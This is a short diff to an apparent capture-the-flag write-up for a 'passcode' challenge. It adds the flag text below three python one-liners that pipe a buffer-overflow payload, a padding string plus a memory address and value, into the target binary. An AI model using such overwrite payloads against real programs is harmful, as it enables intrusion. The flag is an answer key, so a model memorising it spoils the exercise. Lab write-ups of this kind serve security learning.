@@ -35,3 +35,6 @@ python -c 'print "A"*96 + "\x00\xa0\x04\x08" + "134514147\n"' | ./passcode
 python -c 'print "A"*96 + "\x04\xa0\x04\x08" + "134514147\n"' | ./passcode
 python -c 'print "A"*96 + "\x18\xa0\x04\x08" + "134514147\n"' | ./passcode
 ```
+
+flag:
+`Sorry mom.. I got confused about scanf usage :(`
